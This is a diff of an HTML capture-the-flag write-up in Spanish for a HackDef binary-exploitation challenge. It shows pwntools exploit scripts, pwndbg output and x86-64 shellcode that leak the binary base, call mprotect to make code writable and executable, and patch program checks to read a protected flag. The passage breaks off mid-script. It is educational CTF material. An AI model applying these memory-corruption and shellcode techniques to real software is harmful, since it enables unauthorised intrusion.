@@ -151,9 +151,7 @@
 <section class="post" id="analysis">
 <br><h3 class="post-title">Analysis</h3><br>
 
-<p class="plain-text">Al ejecutar el <a href="https://github.com/xchg2pwn/BinaryExploitation/blob/main/HackDef/Credit Cards/mov_eax_flag">binario</a> que se otorga simplemente muestra una dirección de memoria, que ahora mismo no sabemos que es pero podria servirnos como leak del binario.</p>
-<p class="plain-text">Iniciamos desensamblando el binario, la función <code class="language-plaintext highlighter-rouge">main</code>, reserva espacio a una variable <code class="language-plaintext highlighter-rouge">varGlobal</code> y le establece como contenido la string <code class="language-plaintext highlighter-rouge">A</code> o <code class="language-plaintext highlighter-rouge">0x41</code>, luego muestra la dirección de la varible con <code class="language-plaintext highlighter-rouge">printf</code> y llama a <code class="language-plaintext highlighter-rouge">3</code> funciones que ahora analizaremos.</p>
-
+<p class="plain-text">Para este reto se otorga un archivo <a href="https://github.com/xchg2pwn/BinaryExploitation/blob/main/HackDef/CreditCards/chal.zip">zip</a> que contiene tanto el binario como todo el código fuente del proyecto lo que hace que sea mas sencillo analizarlo, también se añaden los archivos de <code class="language-plaintext highlighter-rouge">docker</code> que definen la configuración cuando se lanza el reto.</p>
 <div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
 <code><span class="ve">❯ tree</span><span class="p">
 .
@@ -181,6 +179,7 @@
 2 directories, 19 files</span>
 </code></pre></div></div><br>
 
+<p class="plain-text">El <code class="language-plaintext highlighter-rouge">Dockerfile</code> nos muestra que se copian varios archivos, los binarios, las librerías necesarias y las flags, tanto las individuales así como las específicas del equipo.</p>
 <div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
 <code><span class="ve">❯ cat</span><span class="p"> Dockerfile
 </span><span class="o">FROM</span><span class="p"> ubuntu:</span><span class="na">latest</span><span class="p">
@@ -230,19 +229,19 @@
 </span><span class="o">CMD</span><span class="p"> [</span><span class="s">"/usr/sbin/xinetd"</span><span class="p">,</span><span class="s"> "-filelog"</span><span class="p">,</span><span class="s"> "/dev/stderr"</span><span class="p">,</span><span class="s"> "-dontfork"</span><span class="p">, </span><span class="s">"-f"</span><span class="p">,</span><span class="s"> "/service.conf"</span><span class="p">]</span>
 </code></pre></div></div><br>
 
+<p class="plain-text">Ya que no correremos el proyecto de docker para hacer el exploit será necesario mover los archivos manualmente, iniciando por mover el archivo <code class="language-plaintext highlighter-rouge">print_flag</code> a <code class="language-plaintext highlighter-rouge">/</code> asignando a <code class="language-plaintext highlighter-rouge">root</code> como propietario y privilegios suid, luego movemos las librerías.</p>
 <div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
 <code><span class="ve">❯ ls </span><span class="p">-l /print_flag
--rwsr-xr-x 1 root root 50912 Oct 19 15:18 </span><span class="err">/print_flag</span>
-</code></pre></div></div><br>
+-rwsr-xr-x 1 root root 50912 Oct 19 15:18 </span><span class="err">/print_flag
 
-<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
-<code><span class="ve">❯ ls </span><span class="p">-l /usr/lib/x86_64-linux-gnu/libchecks.so
+</span><span class="ve">❯ ls </span><span class="p">-l /usr/lib/x86_64-linux-gnu/libchecks.so
 -rwxr-xr-x 1 root root 900168 Oct 19 15:17 </span><span class="ve">/usr/lib/x86_64-linux-gnu/libchecks.so</span><span class="p">
 
 </span><span class="ve">❯ ls </span><span class="p">-l /usr/lib/x86_64-linux-gnu/libhackdef.so
 -rwxr-xr-x 1 root root 267520 Oct 19 15:17 </span><span class="ve">/usr/lib/x86_64-linux-gnu/libhackdef.so</span>
 </code></pre></div></div><br>
 
+<p class="plain-text">Luego movemos todas las flags al directorio <code class="language-plaintext highlighter-rouge">/</code>, excepto la flag <code class="language-plaintext highlighter-rouge">06</code> y las flags de los equipos ya que esas se mueven al directorio <code class="language-plaintext highlighter-rouge">/root</code>, en este caso como solo nos interesa la del equipo <code class="language-plaintext highlighter-rouge">MyLittlePwny</code> solo movemos la flag con nomnre <code class="language-plaintext highlighter-rouge">mylpwn</code>.</p>
 <div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
 <code><span class="ve">❯ ls</span><span class="p"> -l /flag_0*.txt
 .rw-r--r-- root root 31 B Sun Oct 19 16:38:10 2025  /flag_00.txt
@@ -252,7 +251,7 @@
 .rw-r--r-- root root 31 B Sun Oct 19 15:54:24 2025  /flag_04.txt
 .rw-r--r-- root root 31 B Mon Oct 20 11:53:27 2025  /flag_05.txt
 
-</span><span class="ve">❯ cat</span><span class="p"> cat /flag_0*.txt
+</span><span class="ve">❯ cat</span><span class="p"> /flag_0*.txt
 hackdef{0_f4k3_fl4g_4_t35t1ng}
 hackdef{1_f4k3_fl4g_4_t35t1ng}
 hackdef{2_f4k3_fl4g_4_t35t1ng}
@@ -1880,36 +1879,36 @@ Te descubri hacker!
 LEGEND:</span><span class="am"> STACK</span><span class="p"> | </span><span class="az">HEAP</span><span class="p"> |</span><span class="ro"> CODE</span><span class="p"> |</span><span class="sa"> DATA </span><span class="p">|</span><span class="ro"> WX</span><span class="p"> | RODATA
              Start                End Perm     Size  Offset File (set vmmap-prefer-relpaths on)
 ►   0x555555554000     0x55555558a000 r--p    36000       0 chal
-►   0x55555558a000     0x5555555aa000 r-xp    20000   36000 chal
-►   0x5555555aa000     0x5555555b4000 r--p     a000   56000 chal
+</span><span class="ro">►   0x55555558a000     0x5555555aa000 r-xp    20000   36000 chal
+</span><span class="p">►   0x5555555aa000     0x5555555b4000 r--p     a000   56000 chal
 ►   0x5555555b4000     0x5555555ba000 r--p     6000   5f000 chal
-►   0x5555555ba000     0x5555555bb000 rw-p     1000   65000 chal
-    0x5555555bb000     0x5555555c0000 rw-p     5000       0 [heap]
-pwndbg> p/x 0x55555558a000 - 0x555555554000
-$1 = 0x36000
-pwndbg></span>
+</span><span class="sa">►   0x5555555ba000     0x5555555bb000 rw-p     1000   65000 chal
+</span><span class="az">    0x5555555bb000     0x5555555c0000 rw-p     5000       0 [heap]
+</span><span class="ro">pwndbg></span><span class="p"> p/x 0x55555558a000 - 0x555555554000
+</span><span class="az">$1</span><span class="p"> = 0x36000
+</span><span class="ro">pwndbg></span>
 </code></pre></div></div><br>
 
 <div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
-<code><span class="ve">#!/usr/bin/python3
-from pwn import gdb
+<code><span class="c1">#!/usr/bin/python3
+</span><span class="o">from</span><span class="p"> pwn</span><span class="o"> import</span><span class="p"> gdb
 
-shell = gdb.debug("./chal", "continue")
+shell</span><span class="o"> =</span><span class="p"> gdb.debug(</span><span class="s">"./chal"</span><span class="p">,</span><span class="s"> "continue"</span><span class="p">)
 
-shell.sendlineafter(b"> ", b"3")
-shell.sendlineafter(b": ", b"admin")
-shell.sendlineafter(b": ", b"MM\x11N")
+shell.sendlineafter(</span><span class="no">b</span><span class="s">"> "</span><span class="p">,</span><span class="no"> b</span><span class="s">"3"</span><span class="p">)
+shell.sendlineafter(</span><span class="no">b</span><span class="s">": "</span><span class="p">,</span><span class="no"> b</span><span class="s">"admin"</span><span class="p">)
+shell.sendlineafter(</span><span class="no">b</span><span class="s">": "</span><span class="p">,</span><span class="no"> b</span><span class="s">"MM\x11N"</span><span class="p">)
 
-shell.sendlineafter(b"> ", b"-1000")
+shell.sendlineafter(</span><span class="no">b</span><span class="s">"> "</span><span class="p">,</span><span class="no"> b</span><span class="s">"-1000"</span><span class="p">)
 
 shell.interactive()</span>
 </code></pre></div></div><br>
 
 <div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
-<code><span class="ve">❯ python3 exploit.py
-[+] Starting local process '/usr/bin/gdbserver': pid 22271
-[*] running in new terminal: ['/usr/bin/gdb', '-q', './chal']
-[*] Switching to interactive mode
+<code><span class="ve">❯ python3</span><span class="p"> exploit.py
+[</span><span class="ve">+</span><span class="p">] Starting local process '/usr/bin/gdbserver': pid 22271
+[</span><span class="az">*</span><span class="p">] running in new terminal: ['/usr/bin/gdb', '-q', './chal']
+[</span><span class="az">*</span><span class="p">] Switching to interactive mode
 SECRETO: 97558834600304
 Servicio interno de tarjetas de credito
 ** Menu:
@@ -1919,51 +1918,51 @@ Servicio interno de tarjetas de credito
 4. Borrar NIP
 5. Salir
 > OK
-$</span>
+</span><span class="ro">$</span>
 </code></pre></div></div><br>
 
 <div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
-<code><span class="ve">pwndbg> x/i 97558834600304
-   0x58baafae5970 &lt_Z8tarjetasB5cxx11+208>:     add    BYTE PTR [rax],al
-pwndbg> vmmap chal
-LEGEND: STACK | HEAP | CODE | DATA | WX | RODATA
+<code><span class="ro">pwndbg></span><span class="p"> x/i 97558834600304
+   </span><span class="az">0x58baafae5970</span><span class="p"> &lt</span><span class="am">_Z8tarjetasB5cxx11</span><span class="p">+208>:     </span><span class="ve">add</span><span class="p">    BYTE PTR [</span><span class="ro">rax</span><span class="p">],</span><span class="ro">al</span><span class="p">
+</span><span class="ro">pwndbg></span><span class="p"> vmmap chal
+LEGEND:</span><span class="am"> STACK</span><span class="p"> |</span><span class="az"> HEAP</span><span class="p"> |</span><span class="ro"> CODE</span><span class="p"> |</span><span class="sa"> DATA</span><span class="p"> |</span><span class="ro"> WX</span><span class="p"> | RODATA
              Start                End Perm     Size  Offset File (set vmmap-prefer-relpaths on)
 ►   0x58baafa7d000     0x58baafab3000 r--p    36000       0 /home/user/HackDefMty/chal/chal
-►   0x58baafab3000     0x58baafad3000 r-xp    20000   36000 /home/user/HackDefMty/chal/chal
-►   0x58baafad3000     0x58baafadd000 r--p     a000   56000 /home/user/HackDefMty/chal/chal
+</span><span class="ro">►   0x58baafab3000     0x58baafad3000 r-xp    20000   36000 /home/user/HackDefMty/chal/chal
+</span><span class="p">►   0x58baafad3000     0x58baafadd000 r--p     a000   56000 /home/user/HackDefMty/chal/chal
 ►   0x58baafadd000     0x58baafae3000 r--p     6000   5f000 /home/user/HackDefMty/chal/chal
-►   0x58baafae3000     0x58baafae4000 rw-p     1000   65000 /home/user/HackDefMty/chal/chal
+</span><span class="sa">►   0x58baafae3000     0x58baafae4000 rw-p     1000   65000 /home/user/HackDefMty/chal/chal
     0x58baafae4000     0x58baafae9000 rw-p     5000       0 [anon_58baafae4]
-pwndbg> p/x 97558834600304 - 0x58baafa7d000
-$1 = 0x68970
-pwndbg></span>
+</span><span class="ro">pwndbg></span><span class="p"> p/x 97558834600304 - 0x58baafa7d000
+</span><span class="az">$1</span><span class="p"> = 0x68970
+</span><span class="ro">pwndbg></span>
 </code></pre></div></div><br>
 
 <div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
-<code><span class="ve">#!/usr/bin/python3
-from pwn import gdb, log
+<code><span class="c1">#!/usr/bin/python3
+</span><span class="o">from</span><span class="p"> pwn</span><span class="o"> import</span><span class="p"> gdb, log
 
-shell = gdb.debug("./chal", "continue")
+shell</span><span class="o"> =</span><span class="p"> gdb.debug(</span><span class="s">"./chal"</span><span class="p">,</span><span class="s"> "continue"</span><span class="p">)
 
-shell.sendlineafter(b"> ", b"3")
-shell.sendlineafter(b": ", b"admin")
-shell.sendlineafter(b": ", b"MM\x11N")
+shell.sendlineafter(</span><span class="no">b</span><span class="s">"> "</span><span class="p">,</span><span class="no"> b</span><span class="s">"3"</span><span class="p">)
+shell.sendlineafter(</span><span class="no">b</span><span class="s">": "</span><span class="p">,</span><span class="no"> b</span><span class="s">"admin"</span><span class="p">)
+shell.sendlineafter(</span><span class="no">b</span><span class="s">": "</span><span class="p">,</span><span class="no"> b</span><span class="s">"MM</span><span class="mi">\x11</span><span class="s">N"</span><span class="p">)
 
-shell.sendlineafter(b"> ", b"-1000")
-shell.recvuntil(b": ")
+shell.sendlineafter(</span><span class="no">b</span><span class="s">"> "</span><span class="p">,</span><span class="no"> b</span><span class="s">"-1000"</span><span class="p">)
+shell.recvuntil(</span><span class="no">b</span><span class="s">": "</span><span class="p">)
 
-binary_base = int(shell.recvline().strip()) - 0x68970
-log.info(f"Binary base: {hex(binary_base)}")
+binary_base </span><span class="o">=</span><span class="na"> int</span><span class="p">(shell.recvline().strip()) </span><span class="o">- </span><span class="mi">0x68970</span><span class="p">
+log.info(</span><span class="no">f</span><span class="s">"Binary base:</span><span class="p"> {</span><span class="no">hex</span><span class="p">(binary_base)}</span><span class="s">"</span><span class="p">)
 
 shell.interactive()</span>
 </code></pre></div></div><br>
 
 <div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
-<code><span class="ve">❯ python3 exploit.py
-[+] Starting local process '/usr/bin/gdbserver': pid 29262
-[*] running in new terminal: ['/usr/bin/gdb', '-q', './chal']
-[*] Binary base: 0x628e0c123000
-[*] Switching to interactive mode
+<code><span class="ve">❯ python3 </span><span class="p">exploit.py
+[</span><span class="ve">+</span><span class="p">] Starting local process '/usr/bin/gdbserver': pid 29262
+[</span><span class="az">*</span><span class="p">] running in new terminal: ['/usr/bin/gdb', '-q', './chal']
+[</span><span class="az">*</span><span class="p">] Binary base: 0x628e0c123000
+[</span><span class="az">*</span><span class="p">] Switching to interactive mode
 Servicio interno de tarjetas de credito
 ** Menu:
 1. Registrar tarjeta
@@ -1971,146 +1970,146 @@ Servicio interno de tarjetas de credito
 3. Consultar NIP
 4. Borrar NIP
 5. Salir
-> $</span>
+> </span><span class="ro">$</span>
 </code></pre></div></div><br>
 
 <div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
-<code><span class="ve">pwndbg> vmmap 0x628e0c123000
-LEGEND: STACK | HEAP | CODE | DATA | WX | RODATA
+<code><span class="ro">pwndbg></span><span class="p"> vmmap 0x628e0c123000
+LEGEND:</span><span class="am"> STACK</span><span class="p"> |</span><span class="az"> HEAP</span><span class="p"> |</span><span class="ro"> CODE</span><span class="p"> |</span><span class="sa"> DATA</span><span class="p"> |</span><span class="ro"> WX</span><span class="p"> | RODATA
              Start                End Perm     Size  Offset File (set vmmap-prefer-relpaths on)
 ►   0x628e0c123000     0x628e0c159000 r--p    36000       0 /home/user/HackDefMty/chal/chal +0x0
-    0x628e0c159000     0x628e0c179000 r-xp    20000   36000 /home/user/HackDefMty/chal/chal
+</span><span class="ro">    0x628e0c159000     0x628e0c179000 r-xp    20000   36000 /home/user/HackDefMty/chal/chal
 pwndbg></span>
 </code></pre></div></div><br>
 
 <div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
-<code><span class="ve">#!/usr/bin/python3
-from pwn import gdb, asm, p64, log
+<code><span class="c1">#!/usr/bin/python3
+</span><span class="o">from </span><span class="p">pwn</span><span class="o"> import</span><span class="p"> gdb, asm, p64, log
 
-shell = gdb.debug("./chal", "continue")
+shell</span><span class="o"> =</span><span class="p"> gdb.debug(</span><span class="s">"./chal"</span><span class="p">,</span><span class="s"> "continue"</span><span class="p">)
 
-shell.sendlineafter(b"> ", b"3")
-shell.sendlineafter(b": ", b"admin")
-shell.sendlineafter(b": ", b"MM\x11N")
+shell.sendlineafter(</span><span class="no">b</span><span class="s">"> "</span><span class="p">,</span><span class="no"> b</span><span class="s">"3"</span><span class="p">)
+shell.sendlineafter(</span><span class="no">b</span><span class="s">": "</span><span class="p">,</span><span class="no"> b</span><span class="s">"admin"</span><span class="p">)
+shell.sendlineafter(</span><span class="no">b</span><span class="s">": "</span><span class="p">,</span><span class="no"> b</span><span class="s">"MM</span><span class="mi">\x11</span><span class="s">N"</span><span class="p">)
 
-shell.sendlineafter(b"> ", b"-1000")
-shell.recvuntil(b": ")
+shell.sendlineafter(</span><span class="no">b</span><span class="s">"> "</span><span class="p">,</span><span class="no"> b</span><span class="s">"-1000"</span><span class="p">)
+shell.recvuntil(</span><span class="no">b</span><span class="s">": "</span><span class="p">)
 
-binary_base = int(shell.recvline().strip()) - 0x68970
+binary_base </span><span class="o">=</span><span class="na"> int</span><span class="p">(shell.recvline().strip()) </span><span class="o">- </span><span class="mi">0x68970</span><span class="p">
 
-shellcode = asm(f"""
-    mov rdi, {hex(binary_base + 0x36000)} # $rdi = .text
+shellcode</span><span class="o"> =</span><span class="p"> asm(</span><span class="no">f</span><span class="s">"""
+    mov rdi, </span><span class="p">{</span><span class="no">hex</span><span class="p">(binary_base</span><span class="o"> +</span><span class="mi"> 0x36000</span><span class="p">)} </span><span class="s"># $rdi = .text
     mov rsi, 0x20000                      # $rsi = size
     mov rdx, 0x7                          # $rdx = rwx
     push 0xa                              # mprotect()
     pop rax                               # $rax = mprotect()
     syscall                               # syscall
-""", arch="amd64")
+"""</span><span class="p">, </span><span class="ra">arch</span><span class="o">=</span><span class="s">"amd64"</span><span class="p">)
 
-shell.sendlineafter(b"> ", b"21222")
-shell.sendlineafter(b": \n", str(len(shellcode)).encode())
-shell.sendlineafter(b":", shellcode)
-shell.recvuntil(b": ")
+shell.sendlineafter(</span><span class="no">b</span><span class="s">"> "</span><span class="p">,</span><span class="no"> b</span><span class="s">"21222"</span><span class="p">)
+shell.sendlineafter(</span><span class="no">b</span><span class="s">": </span><span class="mi">\n</span><span class="s">"</span><span class="p">,</span><span class="na"> str</span><span class="p">(</span><span class="no">len</span><span class="p">(shellcode)).encode())
+shell.sendlineafter(</span><span class="no">b</span><span class="s">":"</span><span class="p">, shellcode)
+shell.recvuntil(</span><span class="no">b</span><span class="s">": "</span><span class="p">)
 
-rwx = int(shell.recvline().strip())
-payload = p64(rwx) * 512
+rwx</span><span class="o"> =</span><span class="no"> int</span><span class="p">(shell.recvline().strip())
+payload </span><span class="o">= </span><span class="p">p64(rwx)</span><span class="o"> *</span><span class="mi"> 512</span><span class="p">
 
-shell.sendlineafter(b"> ", b"2")
-shell.sendlineafter(b"> ", b"-2196")
-shell.sendlineafter(b": ", str(len(payload)).encode())
-shell.sendlineafter(b": ", payload)
+shell.sendlineafter(</span><span class="no">b</span><span class="s">"> "</span><span class="p">,</span><span class="s"> b"2"</span><span class="p">)
+shell.sendlineafter(</span><span class="no">b</span><span class="s">"> "</span><span class="p">, </span><span class="no">b</span><span class="s">"-2196"</span><span class="p">)
+shell.sendlineafter(</span><span class="no">b</span><span class="s">": "</span><span class="p">,</span><span class="na"> str</span><span class="p">(</span><span class="no">len</span><span class="p">(payload)).encode())
+shell.sendlineafter(</span><span class="no">b</span><span class="s">": "</span><span class="p">, payload)
 
 shell.interactive()</span>
 </code></pre></div></div><br>
 
 <div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
-<code><span class="ve">pwndbg> vmmap chal
-LEGEND: STACK | HEAP | CODE | DATA | WX | RODATA
+<code><span class="ro">pwndbg></span><span class="p"> vmmap chal
+LEGEND:</span><span class="am"> STACK</span><span class="p"> |</span><span class="az"> HEAP</span><span class="p"> |</span><span class="ro"> CODE</span><span class="p"> |</span><span class="sa"> DATA</span><span class="p"> |</span><span class="ro"> WX</span><span class="p"> | RODATA
              Start                End Perm     Size  Offset File (set vmmap-prefer-relpaths on)
 ►   0x5ec353647000     0x5ec35367d000 r--p    36000       0 /home/user/HackDefMty/chal/chal
-►   0x5ec35367d000     0x5ec35369d000 rwxp    20000   36000 /home/user/HackDefMty/chal/chal
-►   0x5ec35369d000     0x5ec3536a7000 r--p     a000   56000 /home/user/HackDefMty/chal/chal
+</span><span class="ro">►   0x5ec35367d000     0x5ec35369d000 rwxp    20000   36000 /home/user/HackDefMty/chal/chal
+</span><span class="p">►   0x5ec35369d000     0x5ec3536a7000 r--p     a000   56000 /home/user/HackDefMty/chal/chal
 ►   0x5ec3536a7000     0x5ec3536ad000 r--p     6000   5f000 /home/user/HackDefMty/chal/chal
-►   0x5ec3536ad000     0x5ec3536ae000 rw-p     1000   65000 /home/user/HackDefMty/chal/chal
+</span><span class="sa">►   0x5ec3536ad000     0x5ec3536ae000 rw-p     1000   65000 /home/user/HackDefMty/chal/chal
     0x5ec3536ae000     0x5ec3536b3000 rw-p     5000       0 [anon_5ec3536ae]
-pwndbg></span>
+</span><span class="ro">pwndbg></span>
 </code></pre></div></div><br>
 
 <div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
-<code><span class="ve">shellcode = asm(f"""
-    mov rdi, {hex(binary_base + 0x36000)} # $rdi = .text
+<code><span class="p">shellcode </span><span class="o">= </span><span class="p">asm(</span><span class="no">f</span><span class="s">"""
+    mov rdi, </span><span class="p">{</span><span class="no">hex</span><span class="p">(binary_base</span><span class="o"> +</span><span class="mi"> 0x36000</span><span class="p">)} </span><span class="s"># $rdi = .text
     mov rsi, 0x20000                      # $rsi = size
     mov rdx, 0x7                          # $rdx = rwx
     push 0xa                              # mprotect()
     pop rax                               # $rax = mprotect()
     syscall                               # syscall
 
-    mov rdi, {hex(binary_base + 0x40171)} # $rdi = &salir()
+    mov rdi, </span><span class="p">{</span><span class="no">hex</span><span class="p">(binary_base</span><span class="o"> +</span><span class="mi"> 0x40171</span><span class="p">)}</span><span class="s"> # $rdi = &salir()
     mov byte ptr [rdi], 0xc3              # salir() = ret
-    mov rdi, {hex(binary_base + 0x49ea6)} # $rdi = &timeout
+    mov rdi, </span><span class="p">{</span><span class="no">hex</span><span class="p">(binary_base</span><span class="o"> +</span><span class="mi"> 0x49ea6</span><span class="p">)}</span><span class="s"> # $rdi = &timeout
     mov dword ptr [rdi], 0x493e0          # timeout = 5 mins
 
-    mov rdi, {hex(binary_base + 0x4ab67)} # $rdi = &check
+    mov rdi, </span><span class="p">{</span><span class="no">hex</span><span class="p">(binary_base</span><span class="o"> +</span><span class="mi"> 0x4ab67</span><span class="p">)}</span><span class="s"> # $rdi = &check
     mov byte ptr [rdi], 0x1               # check = true
-    mov rdi, {hex(binary_base + 0x49e78)} # $rdi = &range
+    mov rdi, </span><span class="p">{</span><span class="no">hex</span><span class="p">(binary_base</span><span class="o"> +</span><span class="mi"> 0x49e78</span><span class="p">)}</span><span class="s"> # $rdi = &range
     mov dword ptr [rdi], 0xff             # range = randint(0xff)
 
     ret                                   # return
-""")</span>
+"""</span><span class="p">,</span><span class="ra"> arch</span><span class="o">=</span><span class="s">"amd64"</span><span class="p">)</span>
 </code></pre></div></div><br>
 
 <div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
-<code><span class="ve">#!/usr/bin/python3
-from pwn import process, asm, p64, log, hashlib
+<code><span class="c1">#!/usr/bin/python3
+</span><span class="o">from</span><span class="p"> pwn</span><span class="o"> import</span><span class="p"> process, asm, p64, log, hashlib
 
-shell = process("./chal")
+shell</span><span class="o"> =</span><span class="p"> process(</span><span class="s">"./chal"</span><span class="p">)
 
-shell.sendlineafter(b"> ", b"3")
-shell.sendlineafter(b": ", b"admin")
-shell.sendlineafter(b": ", b"MM\x11N")
+shell.sendlineafter(</span><span class="no">b</span><span class="s">"> "</span><span class="p">,</span><span class="no"> b</span><span class="s">"3"</span><span class="p">)
+shell.sendlineafter(</span><span class="no">b</span><span class="s">": "</span><span class="p">,</span><span class="no"> b</span><span class="s">"admin"</span><span class="p">)
+shell.sendlineafter(</span><span class="no">b</span><span class="s">": "</span><span class="p">,</span><span class="no"> b</span><span class="s">"MM</span><span class="mi">\x11</span><span class="s">N"</span><span class="p">)
 
-shell.sendlineafter(b"> ", b"-1000")
-shell.recvuntil(b": ")
+shell.sendlineafter(</span><span class="no">b</span><span class="s">"> "</span><span class="p">,</span><span class="no"> b</span><span class="s">"-1000"</span><span class="p">)
+shell.recvuntil(</span><span class="no">b</span><span class="s">": "</span><span class="p">)
 
-binary_base = int(shell.recvline().strip()) - 0x68970
+binary_base </span><span class="o">=</span><span class="na"> int</span><span class="p">(shell.recvline().strip()) </span><span class="o">- </span><span class="mi">0x68970</span><span class="p">
 
-shellcode = asm(f"""
-    mov rdi, {hex(binary_base + 0x36000)} # $rdi = .text
+shellcode </span><span class="o">= </span><span class="p">asm(</span><span class="no">f</span><span class="s">"""
+    mov rdi, </span><span class="p">{</span><span class="no">hex</span><span class="p">(binary_base</span><span class="o"> +</span><span class="mi"> 0x36000</span><span class="p">)} </span><span class="s"># $rdi = .text
     mov rsi, 0x20000                      # $rsi = size
     mov rdx, 0x7                          # $rdx = rwx
     push 0xa                              # mprotect()
     pop rax                               # $rax = mprotect()
     syscall                               # syscall
 
-    mov rdi, {hex(binary_base + 0x40171)} # $rdi = &salir()
+    mov rdi, </span><span class="p">{</span><span class="no">hex</span><span class="p">(binary_base</span><span class="o"> +</span><span class="mi"> 0x40171</span><span class="p">)}</span><span class="s"> # $rdi = &salir()
     mov byte ptr [rdi], 0xc3              # salir() = ret
-    mov rdi, {hex(binary_base + 0x49ea6)} # $rdi = &timeout
+    mov rdi, </span><span class="p">{</span><span class="no">hex</span><span class="p">(binary_base</span><span class="o"> +</span><span class="mi"> 0x49ea6</span><span class="p">)}</span><span class="s"> # $rdi = &timeout
     mov dword ptr [rdi], 0x493e0          # timeout = 5 mins
 
-    mov rdi, {hex(binary_base + 0x4ab67)} # $rdi = &check
+    mov rdi, </span><span class="p">{</span><span class="no">hex</span><span class="p">(binary_base</span><span class="o"> +</span><span class="mi"> 0x4ab67</span><span class="p">)}</span><span class="s"> # $rdi = &check
     mov byte ptr [rdi], 0x1               # check = true
-    mov rdi, {hex(binary_base + 0x49e78)} # $rdi = &range
+    mov rdi, </span><span class="p">{</span><span class="no">hex</span><span class="p">(binary_base</span><span class="o"> +</span><span class="mi"> 0x49e78</span><span class="p">)}</span><span class="s"> # $rdi = &range
     mov dword ptr [rdi], 0xff             # range = randint(0xff)
 
     ret                                   # return
-""", arch="amd64")
+"""</span><span class="p">, </span><span class="ra">arch</span><span class="o">=</span><span class="s">"amd64"</span><span class="p">)
 
-shell.sendlineafter(b"> ", b"21222")
-shell.sendlineafter(b": \n", str(len(shellcode)).encode())
-shell.sendlineafter(b":", shellcode)
-shell.recvuntil(b": ")
+shell.sendlineafter(</span><span class="no">b</span><span class="s">"> "</span><span class="p">,</span><span class="no"> b</span><span class="s">"21222"</span><span class="p">)
+shell.sendlineafter(</span><span class="no">b</span><span class="s">": </span><span class="mi">\n</span><span class="s">"</span><span class="p">,</span><span class="na"> str</span><span class="p">(</span><span class="no">len</span><span class="p">(shellcode)).encode())
+shell.sendlineafter(</span><span class="no">b</span><span class="s">":"</span><span class="p">, shellcode)
+shell.recvuntil(</span><span class="no">b</span><span class="s">": "</span><span class="p">)
 
-rwx = int(shell.recvline().strip())
-payload = p64(rwx) * 512
+rwx</span><span class="o"> =</span><span class="no"> int</span><span class="p">(shell.recvline().strip())
+payload </span><span class="o">= </span><span class="p">p64(rwx)</span><span class="o"> *</span><span class="mi"> 512</span><span class="p">
 
-shell.sendlineafter(b"> ", b"2")
-shell.sendlineafter(b"> ", b"-2196")
-shell.sendlineafter(b": ", str(len(payload)).encode())
-shell.sendlineafter(b": ", payload)
+shell.sendlineafter(</span><span class="no">b</span><span class="s">"> "</span><span class="p">,</span><span class="s"> b"2"</span><span class="p">)
+shell.sendlineafter(</span><span class="no">b</span><span class="s">"> "</span><span class="p">, </span><span class="no">b</span><span class="s">"-2196"</span><span class="p">)
+shell.sendlineafter(</span><span class="no">b</span><span class="s">": "</span><span class="p">,</span><span class="na"> str</span><span class="p">(</span><span class="no">len</span><span class="p">(payload)).encode())
+shell.sendlineafter(</span><span class="no">b</span><span class="s">": "</span><span class="p">, payload)
 
-shell.recvline_contains(b"vigilando...")
+shell.recvline_contains(</span><span class="no">b</span><span class="s">"vigilando..."</span><span class="p">)
 
-shellcode = asm("""
+shellcode</span><span class="o"> =</span><span class="p"> asm(</span><span class="s">"""
     push 0x5                 # /print_flag stdout
     pop rdi                  # $rdi = fd
     mov rsi, rsp             # $rsi = flag
@@ -2168,42 +2167,42 @@ shellcode = asm("""
     pop rdi                  # $rdi = stdout
     mov rax, rdi             # $rax = write()
     syscall                  # syscall
-""", arch="amd64")
+"""</span><span class="p">,</span><span class="ra"> arch</span><span class="o">=</span><span class="s">"amd64"</span><span class="p">)
 
-shell.sendline(b"21222")
-shell.sendlineafter(b": \n", str(len(shellcode)).encode())
-shell.sendlineafter(b":", shellcode)
-shell.recvuntil(b": ")
+shell.sendlineafter(</span><span class="no">b</span><span class="s">"> "</span><span class="p">,</span><span class="no"> b</span><span class="s">"21222"</span><span class="p">)
+shell.sendlineafter(</span><span class="no">b</span><span class="s">": </span><span class="mi">\n</span><span class="s">"</span><span class="p">,</span><span class="na"> str</span><span class="p">(</span><span class="no">len</span><span class="p">(shellcode)).encode())
+shell.sendlineafter(</span><span class="no">b</span><span class="s">":"</span><span class="p">, shellcode)
+shell.recvuntil(</span><span class="no">b</span><span class="s">": "</span><span class="p">)
 
-rwx = int(shell.recvline().strip())
-payload = p64(rwx) * 512
+rwx</span><span class="o"> =</span><span class="no"> int</span><span class="p">(shell.recvline().strip())
+payload </span><span class="o">= </span><span class="p">p64(rwx)</span><span class="o"> *</span><span class="mi"> 512</span><span class="p">
 
-shell.sendlineafter(b"> ", b"2")
-shell.sendlineafter(b"> ", b"-2196")
-shell.sendlineafter(b": ", str(len(payload)).encode())
-shell.sendlineafter(b": ", payload)
+shell.sendlineafter(</span><span class="no">b</span><span class="s">"> "</span><span class="p">,</span><span class="s"> b"2"</span><span class="p">)
+shell.sendlineafter(</span><span class="no">b</span><span class="s">"> "</span><span class="p">, </span><span class="no">b</span><span class="s">"-2196"</span><span class="p">)
+shell.sendlineafter(</span><span class="no">b</span><span class="s">": "</span><span class="p">,</span><span class="na"> str</span><span class="p">(</span><span class="no">len</span><span class="p">(payload)).encode())
+shell.sendlineafter(</span><span class="no">b</span><span class="s">": "</span><span class="p">, payload)
 
-shell.recvline_contains(b"hackdef")
-nonce = shell.recv(32)
+shell.recvline_contains(</span><span class="no">b</span><span class="s">"hackdef"</span><span class="p">)
